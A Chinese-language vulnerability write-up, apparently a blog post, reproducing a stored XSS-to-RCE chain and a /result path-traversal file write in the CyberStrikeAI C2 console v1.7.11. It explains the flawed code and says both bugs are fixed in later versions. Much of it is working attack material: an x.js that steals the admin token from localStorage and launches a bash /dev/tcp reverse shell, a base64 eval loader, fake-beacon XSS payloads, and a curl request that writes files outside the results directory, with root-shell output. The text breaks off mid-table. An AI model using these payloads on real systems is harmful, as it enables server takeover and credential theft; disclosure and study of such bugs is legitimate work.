#  CyberStrikeAI C2 控制台代码审计：存储型 XSS 链式 RCE 与 /result 任意文件写入  
原创 MY0723
                    MY0723  不秃头的安全   2026-10-30 04:18  
  
# CyberStrikeAI C2 控制台代码审计：存储型 XSS 链式 RCE 与 /result 任意文件写入  
> 复现环境：CyberStrikeAI v1.7.11  
（源码 tag），Go 1.26.3 + SQLite(WAL)，Debian 12，Chromium 156。 全部结论均在上述环境实测复。 本文根据https://mp.weixin.qq.com/s/3XXw61i1XTDxJsih848uTQ复现  
  
## 一、漏洞清单  
  
<table><thead><tr style="border-top: none;background-color: #FFFFFF;"><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">#</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">漏洞</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">类型</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">受影响组件</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">影响版本</span></section></th></tr></thead><tbody><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">A</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">Web 控制台多处存储型 XSS</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">存储型 XSS → RCE</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">web/static/js/c2.js</span></code><section><span leaf=""> + HTTP/HTTPS Beacon Listener</span></section></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">≤ v1.7.11</span></section></td></tr><tr style="border-top: none;background-color: #FAFAFA;"><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">B</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/result</span></code><section><span leaf=""> 端点任意文件写入</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">路径穿越 / 任意文件写入</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">HTTP/HTTPS Beacon Listener</span></section></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><section><span leaf="">≤ v1.7.11</span></section></td></tr></tbody></table>  
  
  
漏洞 A 和 B 不是独立的：A 的注入点负责把攻击者的东西送进管理员的浏览器，B 负责在 C2 主控端落盘任意文件。两条线最终都指向同一个目标——**C2 主控端服务器本身**  
，不是已上线的被控端。  
  
复现了 main  
 分支（v1.7.24）的修复代码，两个漏洞都已在最新版本修掉。  
## 二、漏洞 A：Web 控制台存储型 XSS  
### 2.1 根因  
  
问题出在 web/static/js/c2.js  
 的 sessionInfoRow()  
 函数（第 471–493 行）。它给会话详情里的「复制」按钮生成 inline onclick  
：  
```
// web/static/js/c2.js:481? `<button type="button" class="c2-session-info-copy" title="..." aria-label="..."     onclick="event.stopPropagation(); C2.copyText(${JSON.stringify(String(value))})">
```  
  
value  
 来自 s.implantUuid  
（第 511 行）和 s.internalIp  
（第 535 行），是 Beacon 上线时自己填的字段，服务端原样存库。  
  
关键在于 JSON.stringify()  
 和 escapeHtml()  
 解决的是两个完全不同的问题：  
```
// web/static/js/c2.js:634-639 —— 文本上下文转义，是对的function escapeHtml(text) {    if (!text) return '';    const div = document.createElement('div');    div.textContent = text;    return div.innerHTML;}
```  
  
escapeHtml  
 走 textContent → innerHTML  
，会把 <  
、>  
、&  
、"  
 全部转义。但 JSON.stringify()  
 只做 JavaScript 字符串层面的转义：它会把 "  
 变成 \"  
，**不会碰 < 和 >**  
。而 HTML 属性解析器里，反斜杠不是转义符——\"  
 里的那个 "  
 照样会闭合属性。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSYNO6fRUpYWibYcpa5Axp323K1icdbsKe3GG2rjGXT7rhWG9DhBzo6liavxz60f9tTMjgtYlcnKdfbibSIc4HVVoiclMtxmSYNndwwU/640?wx_fmt=png&from=appmsg "")  
  
  
<img src=x>  
 的 src 加载必然失败，于是 onerror  
 自动触发。整个过程不需要管理员点击任何东西，鼠标悬停都不用。  
### 2.2 注入点 A：会话详情的复制按钮  
```
// c2.js:511${sessionInfoRow(c2t('c2.sessions.infoImplantUuid'), s.implantUuid, { mono: true, copy: true })}// c2.js:535${sessionInfoRow(c2t('c2.sessions.infoInternalIp'), s.internalIp || '-', { mono: true, accent: true, copy: true })}
```  
  
copy: true  
 才会渲染出那个带 inline onclick  
 的按钮。  
  
这里有个被忽略的放大因素——c2.js:1486-1489  
：  
```
if (!C2.selectedSessionId && C2.sessions.length > 0) {    C2.selectSession(C2.sessions[0].id);}
```  
  
会话列表加载完会自动选中第一条并渲染详情面板。也就是说管理员只要打开「C2 → 会话」这个页面，**最新的那条恶意会话就会被自动渲染，XSS 立刻触发**  
。实测时我甚至没有点击会话卡片，弹窗就弹出来了。  
### 2.3 注入点 B：文件列表的操作按钮  
```
// c2.js:2788-2789? `<button class="btn-ghost btn-sm c2-file-action-btn" onclick='C2.openDirectory(${JSON.stringify(entry.name)})'>...</button>`: `<button class="btn-ghost btn-sm c2-file-action-btn" onclick='C2.downloadFile(${JSON.stringify(entry.name)})'>...</button>`
```  
  
这一处属性用的是**单引号**  
包裹。JSON.stringify  
 转义双引号，但文件名里的单引号 '  
 它不管。entry.name  
 来自 Beacon ls  
 任务回传的文件名，攻击者可控。  
  
这条路径有一个特别直观的视觉特征。文件名取 x'><img src=x onerror=alert(document.cookie) width=0 height=0>  
，渲染出来的 HTML 是：  
```
onclick='C2.downloadFile("x'><img src=x onerror=alert(document.cookie) width=0 height=0>")'
```  
  
单引号在 x'  
 处就闭合了属性，后面的 >  
 闭合了 button 标签。结果是按钮上残留的文字变成了 ">Download  
——**属性边界被突破的痕迹直接显示在 UI 上**  
，见后文截图。![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSZeD4PQ6GnY7HC1oTKmeVp2VXI6q6Lick5qUk0tKs2DMhVcAd4cFylF6EEPrBwlvTXBnXqVO4M4tKQg8cP9Y4wI5HrKuINIf2U8/640?wx_fmt=png&from=appmsg "")  
  
### 2.4 Token 存在哪  
```
// web/static/js/auth.js:1const AUTH_STORAGE_KEY = 'cyberstrike-auth';// web/static/js/auth.js:29localStorage.setItem(AUTH_STORAGE_KEY, JSON.stringify({ token, expiresAt, ... }));
```  
  
Token 明文存在 localStorage，任何在控制台同源下执行的 JS 都能直接读。顺带说明一个细节：alert(document.cookie)  
 弹出来是**空的**  
，因为这个平台没用 Cookie 传 Token，认证信息只在 localStorage 里。所以想要实际拿到 Token，payload 得读 localStorage['cyberstrike-auth']  
。  
  
另外确认一下，C2 控制台**没有配置任何 CSP**  
，curl -I  
 的响应头里也没有 Content-Security-Policy  
，外部脚本 <script src>  
 随便加载。  
### 2.5 拿到 Token 之后  
  
C2 自带一个「终端」功能，internal/app/app.go:1076  
 注册了路由：  
```
protected.POST("/terminal/run", terminalHandler.RunCommand)protected.POST("/terminal/run/stream", terminalHandler.RunCommandStream)protected.GET("/terminal/ws", terminalHandler.RunCommandWS)
```  
  
internal/handler/terminal.go:95-97  
：  
```
if runtime.GOOS == "windows" {    cmd = exec.CommandContext(ctx, "cmd", "/c", cmdStr)} else {    cmd = exec.CommandContext(ctx, shell, "-c", cmdStr)}
```  
  
第 122 行 cmd.Run()  
 直接在 **C2 主控端**  
本地执行。不是下发到被控端，是主控端自己的 shell。任何能调用这个接口的人，都拿到了整个 C2 基础设施的控制权。  
> 顺手提醒一个容易搞混的地方：C2 会话详情里那个「Terminal」标签页**不是**  
这个接口，它是把命令作为 shell  
 任务下发给被控端执行的；真正跑在主控端本地的是 /api/terminal/*  
 这组（对应「设置 → 终端」）。区别见 5.10 节。  
  
## 三、漏洞 B：/result 任意文件写入  
### 3.1 两个缺陷叠加  
  
**缺陷一：明文 JSON 回退**  
  
internal/c2/listener_http.go:293-304  
：  
```
plaintext, decErr := DecryptAESGCM(l.rec.EncryptionKey, string(body))if decErr == nil {    if err := json.Unmarshal(plaintext, &report); err != nil {        l.disguisedReject(w)        return    }} else {    if err := json.Unmarshal(body, &report); err != nil {   // ← 解密失败就当明文解析        l.disguisedReject(w)        return    }}
```  
  
注释里写的是「兼容 curl oneliner 等轻量级客户端」。实际效果是整个 AES-GCM 加密通道形同虚设——攻击者直接发明文 JSON 就能过。/check_in  
 端点有同样的回退逻辑，所以假 Beacon 连 AES Key 都不需要。  
  
**缺陷二：blob_suffix 路径穿越**  
  
internal/c2/manager.go:738-759  
：  
```
func (m *Manager) saveResultBlob(taskID, b64Content, suffix string) (string, error) {    suffix = strings.TrimSpace(suffix)    if suffix == "" {        suffix = ".bin"    }    if !strings.HasPrefix(suffix, ".") {        suffix = "." + suffix          // 只补一个点，不校验 ../ 和 \ ，也不限制后缀    }    dir := filepath.Join(m.storageDir, "results")    if err := osMkdirAll(dir, 0o755); err != nil {        return "", err    }    path := filepath.Join(dir, taskID+suffix)   // ← 路径穿越点    data, err := base64Decode(b64Content)      // ← 内容完全由攻击者控制    if err != nil {        return "", err    }    if err := osWriteFile(path, data, 0o644); err != nil {        return "", err    }    return path, nil}
```  
  
taskID  
 来自数据库里真实存在的任务，suffix  
 来自 TaskResultReport.BlobSuffix  
（internal/c2/types.go:218  
），是完全用户可控的字段。  
  
internal/c2/manager.go:661-667  
 里对任务只做了存在性校验：  
```
t, err := m.db.GetC2Task(report.TaskID)if err != nil {    return err}if t == nil {    return ErrTaskNotFound}
```  
  
**不校验任务状态**  
（已完成、已失败的都行），**不校验任务归属**  
（A 会话的任务可以被 B 会话回结果），**不校验调用者身份**  
。  
### 3.2 落点分析  
  
filepath.Join  
 会先拼接再 Clean  
，所以穿越段数直接决定落点：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSaaiaWSgC10TgW5h7TTiciaKXm3zVQUaOV6Ag69rNthYoKFq1MkaEGehqhd3mr4UMpq2T0jF3CCzMBhhjdqN3NObJ7m6L0f4El1lg/640?wx_fmt=png&from=appmsg "")  
**第一行值得单独说。**  
 公开 PoC 里给的示例 suffix 是一长串 ./  
，按 filepath.Join  
 的语义，./  
 会被 Clean  
 全部吃掉，等价于文件名后面跟了个 .  
，**根本跳不出 results 目录**  
。真正能穿越的形态必须以 /  
 开头（taskID  
 和 suffix  
 是直接字符串拼接的，/  
 把 taskID 变成了一个路径段），比如 /../../../../xxx  
。  
  
还有个容易踩的坑：saveResultBlob  
 只对 results  
 目录做了 MkdirAll  
，**穿越目标路径的父目录如果不存在，os.WriteFile 会失败**  
。而 IngestTaskResult  
 只是把这个 error 记一条 warn 日志，接口照样返回 {"ok":"1"}  
。也就是说**接口返回成功不代表文件写成功**  
，验证的时候必须去文件系统上核对。  
### 3.3 同一个文件里的对照证据  
  
这个漏洞最值得写的一点：**handleFileServe 里做了完整校验，saveResultBlob 里一个字都没有。**  
  
internal/c2/listener_http.go:369-373  
：  
```
taskID := strings.TrimPrefix(r.URL.Path, prefix)taskID = strings.TrimSuffix(taskID, ".bin")if taskID == "" || strings.Contains(taskID, "/") || strings.Contains(taskID, "\\") || strings.Contains(taskID, "..") {    l.disguisedReject(w)    return}fpath := filepath.Join(l.manager.StorageDir(), "downstream", taskID+".bin")absPath, err := filepath.Abs(fpath)
```  
  
读文件路径的时候，作者明确防了 ../  
、绝对路径，还做了 filepath.Abs  
 归一化。**写文件路径的时候，这些检查全部缺失。**  
 这不是能力问题，是写的时候漏了。  
## 四、完整攻击链  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSauR8bcBTU0JUuDB8tRnRpnh5n8LTXupebxuBENHMFGaicaDwubEyLqe4rr39nRDTYlNTIw6iaTgIQibia4icPw8kaW5psopaFzzzaY/640?wx_fmt=png&from=appmsg "")  
x.js  
 的核心部分：  
```
function getToken() {    const a = JSON.parse(localStorage.getItem('cyberstrike-auth') || '{}');    return a.token || '';}async function runCmd(command) {    const r = await fetch('/api/terminal/run', {        method: 'POST',        headers: {            'Content-Type': 'application/json',            'Authorization': 'Bearer ' + getToken()        },        body: JSON.stringify({ command })    });    return r.json().catch(() => ({}));}// 脱离父进程，管理员关掉标签页 shell 依然存活const linuxCmd = `nohup bash -c 'bash -i >& /dev/tcp/${HOST}/${PORT} 0>&1' >/dev/null 2>&1 &`;await runCmd(linuxCmd);
```  
  
payload 用 base64 包一层是为了避开无引号的 HTML 属性值里空格和引号被截断的问题：  
```
def build_xss_js_payload(js_url, method='script'):    if method == 'fetch':        js_code = f"fetch('{js_url}').then(t=>t.text()).then(eval)"    else:        js_code = f"var s=document.createElement('script');s.src='{js_url}';document.body.appendChild(s)"    js_b64 = base64.b64encode(js_code.encode()).decode()    return f"eval(atob('{js_b64}'))"
```  
  
script  
 方式靠 <script src>  
 加载，跨域不受 CORS 限制；fetch  
 方式需要目标站点放行 CORS。  
## 五、复现过程  
  
整条链的时序如下，攻击端与受害端各做什么一目了然：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSZl9iaaCMJavribeCicsnU4XhFTdgoIY5NlibQKoLCPxEYzB0QibSxwPpuIzwEAqsLo1xwiaPpkl7UAuzTnibghO2lsRSic0pqjGibVxoQg/640?wx_fmt=png&from=appmsg "")  
  
### 5.1 环境搭建  
```
# 1. 取漏洞版本源码curl -sL -o v1711.tgz https://codeload.github.com/AIPentest/CyberStrikeAI/tar.gz/refs/tags/v1.7.11tar xzf v1711.tgz && cd CyberStrikeAI-1.7.11# 2. 编译（go.mod 要求 go 1.25+）export PATH=/usr/local/go/bin:$PATHexport GOPROXY=https://goproxy.cn,direct GOSUMDB=offgo build -o cyberstrike-ai ./cmd/server# 3. 配置：关 TLS 走明文 HTTP，方便抓包#    config.yaml 里 tls_enabled: false / tls_auto_self_sign: false./cyberstrike-ai --http -config config.yaml
```  
  
启动后控制台打印一次性的初始口令：  
```
● ONLINE   http://127.0.0.1:8080/ADMIN SETUP REQUIRED  Username  admin  Password  G0ddPwk2UhsJXA_ybPCeBtUY
```  
### 5.2 建监听器  
```
POST /api/c2/listeners  (Bearer <admin token>){"name":"http-beacon-01","type":"http_beacon","bind_host":"127.0.0.1","bind_port":9001}→ 200 {"implant_token":"0a-QaG6-p8-tjYkaBSrhXMw3osIpiVgKlOYdR1oPKP0", "listener":{...,"status":"stopped"}}POST /api/c2/listeners/l_3ecbb786a0fa4f/start   → status: running
```  
  
implant_token  
 是**监听器级别共享**  
的，所有从这个监听器生成的 Beacon 用同一个值。  
### 5.3 假 Beacon 上线（注入 XSS）  
  
fake_beacon.py  
 的核心逻辑——check-in 走明文 JSON：  
```
payload = {    'uuid': uuid_val,          # ← 恶意 XSS payload 塞这里    'hostname': 'prod-db-01',    'username': 'root', 'os': 'linux', 'arch': 'amd64',    'pid': 1337, 'process_name': 'systemd', 'is_admin': True,    'internal_ip': internal_ip,    'sleep_seconds': 5, 'jitter_percent': 0,}# POST /check_in   Header: X-Implant-Token: <token>
```  
  
请求带 Accept: application/json  
 或 UA 含 curl/  
，服务端就按明文客户端处理，响应体是明文 JSON。  
  
我在 listener 前面挂了一个记录原始报文的 TCP 代理（127.0.0.1:9002 → 9001），拿到的完整报文长这样：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSbECiaoLH6IHXVAk69z397gzdGeQv4JAtRUd4uluHnGDzT0FzLOQ31qJAOcNhIzyq61pf6pBKomGUnX0721mfX5pM4OTwK4Pdtk/640?wx_fmt=png&from=appmsg "")  
三件事一次看全了：请求体是**明文 JSON**  
，没有 AES 加密；uuid  
 字段里就是完整的 XSS payload；X-Implant-Token  
 是监听器级别共享的那个值。  
  
对应响应：  
```
[check_in] HTTP 200 -> {"session_id":"s_81d34a8882e34d","next_sleep":5,"next_jitter":0,"has_tasks":false,...}
```  
  
会话详情接口里已经能看到注入的原始 payload：  
```
implantUuid = 'x"><img src=x onerror=alert(document.cookie) width=0 height=0>'
```  
### 5.4 基础 XSS 验证  
  
用真实 Chromium 打开控制台并登录，切到 C2 会话页。左侧会话列表里就是刚上线的假 Beacon：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSavicLcqbD9xwcJUib15XPeq8SLNrA8GMpjJtyexg8pMibvOAbNOdjmUVpNK25LzcYm5YgSuv4zgeVZVxw6DHrBkzNxClunMEdKmY/640?wx_fmt=png&from=appmsg "")  
  
  
**没有点击任何会话卡片**  
，页面自动选中了最新会话并渲染详情，原生 alert 弹窗直接弹出：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSZfYvqbW9NFhh20DqjnxnzoCqiciaSPwTMONk1cpr8wDE26ia8DBMjN2lmd2JpatOibwJK4nFAc3gOPRFj7jvS39dB9EibDfqhzjpLU/640?wx_fmt=png&from=appmsg "")  
  
  
把注入的 <img onerror>  
 元素从 DOM 里捞出来（为了截图可见我改了样式，它确实是攻击者注入的元素）：  
```
<img src="x" onerror="alert(document.cookie)" width="0" height="0">
```  
  
会话详情面板上，Implant UUID 一栏原样显示着 payload 字符串：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSaicw70jeKrxybuTWb2HLX0F5ZVMVqgPRnYgxicpyunsiaToAph5vPM4peh90RuRDm2FOA0cevuwqIEha0zNJBmPyOWzyunPmy5Ik/640?wx_fmt=png&from=appmsg "")  
  
  
而复制按钮的 onclick  
 属性已经被撑破，<img>  
 标签作为兄弟节点插进了 DOM：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSYoR4YHhqyUSm22xbRp7zLLBjSvficN7w1Do6lLWbnpSkZic3JsajrVLBKwZ9y9waS36p5nceoC4SNL7IZ5jMDYaK4zLF99d1RdE/640?wx_fmt=png&from=appmsg "")  
  
### 5.5 RCE 链  
  
攻击机起两个服务：  
```
python3 -m http.server 8000        # 托管 x.jsnc -lvnp 9999                      # 接反弹 shell
```  
  
假 Beacon 换成加载外部 JS 的 payload：  
```
python3 fake_beacon.py --server http://127.0.0.1:9001 --token <TOKEN> \    --xss-uuid --xss-js-url "http://127.0.0.1:8000/x.js"
```  
  
管理员打开会话页，攻击机 HTTP 服务立刻收到 x.js 的请求：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSZeticMCIHQTjbe2T2LqhKZI4lTH8kXRADrDoicLSfs6BvwJvlfgVbrXYrMITQTnib34ZPk3ibLnVwXf3icY7bo19swWYFzNXHC9QCo/640?wx_fmt=png&from=appmsg "")  
  
  
浏览器 console：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSY789YIExR0WKBInHDQLp9wWtcDTvqvCEMK2qKAmU5JXqTkLW65RHFia64wEdwX6QK6RPhGPurznUFMMww6n2cPV99boJwBmoF8/640?wx_fmt=png&from=appmsg "")  
  
```
[x.js] admin token = e4f2bfad-2f03-4729-b009-...[x.js] terminal/run response: {"stdout":"","stderr":"","exit_code":0}
```  
  
/api/terminal/run  
 返回 exit_code 0——命令已经在 C2 主控端跑起来了。  
  
把浏览器实际发出的这个请求原样抓下来（Playwright 拦截 request/response）：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSayqyMSIpRA59Ro9sedLqibdDSicNHClQEcR18mI4Y8g9sQmeskMiblln7ibkyC948mHMOfXnyyxHpCCfEWaXsCkbmiboic9v9xVB4Ok/640?wx_fmt=png&from=appmsg "")  
  
  
authorization: Bearer e4f2bfad-...  
 就是从 localStorage  
 里偷到的管理员 Token，body 里就是那条反弹 shell 命令。服务端返回 {"stdout":"","stderr":"","exit_code":0}  
——sh -c  
 起子进程后立刻退出，所以 stdout 是空的，命令实际在后台跑着。  
  
攻击机的 9999 端口收到连接：![](https://mmbiz.qpic.cn/mmbiz_png/I2dhkmhKrSZ2oF4QGozib0F6NUe4Z9rOWAaNn4PI67808xSxYvSPDgLL180Kea3UoM7nDdork8Mwdia6XQ1A5KIica1sKU68JevtasRP7gNTsc/640?wx_fmt=png&from=appmsg "")  
  
```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 41018root@cloud-compute-new-92gsg:/workspace/work/run#[attacker] $ whoamiroot[attacker] $ iduid=0(root) gid=0(root) groups=0(root)[attacker] $ pwd/workspace/work/run
```  
  
pwd  
 的输出是 /workspace/work/run  
——**这就是 C2 主控端进程的工作目录**  
。拿到的是主控端的 shell，不是被控端的。  
### 5.6 任意文件写入  
  
先让假 Beacon 上线拿一个真实任务 ID（ls  
 任务），然后直接用明文 JSON 打 /result  
：  
```
curl -X POST http://127.0.0.1:9001/result \  -H "X-Implant-Token: <TOKEN>" \  -H "Content-Type: application/octet-stream" \  -d '{"task_id":"t_95fbcbb7db6343","session_id":"","success":true,"output":"PoC",       "blob_b64":"dGVzdDEyMw==",       "blob_suffix":"/../../../../VULN_POC_test"}'
```  
  
（下面截图里走的是我挂在 listener 前面的记录代理 127.0.0.1:9002，所以 Host  
 头是 9002。）  
  
这条请求在代理里同样是明文的：![](https://mmbiz.qpic.cn/sz_mmbiz_png/I2dhkmhKrSZiaeBaibKmtKfPCCeiav6WMh8Z9L9meofSqhfK6X1CyFBUmMuBwXtPQXaGlNS2psicgbxjqGYB1bsfNlu3fQTnCTr6uCyd6DR9Fe8/640?wx_fmt=png&from=appmsg "")  
  
  
Content-Type: application/octet-stream  
，body 里直接就是明文 JSON，blob_suffix  
 字段写着 /../../../../web/static/pwned_by_result.js  
。  
  
返回值是 {"ok":"1"}  
。但**接口返回 ok 不代表写成功**  
，得去文件系统上核对。实测结果：  
  
  
<table><thead><tr style="border-top: none;background-color: #FFFFFF;"><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">suffix</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">落点</span></section></th><th style="background: rgb(10, 10, 10);color: rgb(255, 255, 255);font-weight: 700;font-size: 13px;padding: 6px 8px;text-align: center;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(51, 51, 51);border-image: none;line-height: 18.2px;white-space: nowrap;"><section><span leaf="">文件内容</span></section></th></tr></thead><tbody><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">././././…</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">tmp/c2/results/t_95fbcbb7db6343.</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">PoC test 123</span></code><section><span leaf="">（没跳出目录）</span></section></td></tr><tr style="border-top: none;background-color: #FAFAFA;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/../../../VULN_POC_test</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">tmp/VULN_POC_test</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">PoC test 123</span></code></td></tr><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/../../../../pwned_by_result.sh</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">pwned_by_result.sh</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">#!/bin/sh … id</span></code></td></tr><tr style="border-top: none;background-color: #FAFAFA;"><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/../../../../web/static/pwned_by_result.js</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">web/static/pwned_by_result.js</span></code></td><td style="padding: 6px 8px;border-width: medium medium 1px;border-style: none none solid;border-color: currentcolor currentcolor rgb(240, 240, 240);border-image: none;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">alert(&#39;pwned by …&#39;)</span></code></td></tr><tr style="border-top: none;background-color: #FFFFFF;"><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 0.88);font-size: 13px;line-height: 18.2px;white-space: nowrap;text-align: center;"><code style="color: rgba(0, 0, 0, 0.88);"><span leaf="">/../../../../does/not/exist/pwned.txt</span></code></td><td style="padding: 6px 8px;border: medium;color: rgba(0, 0, 0, 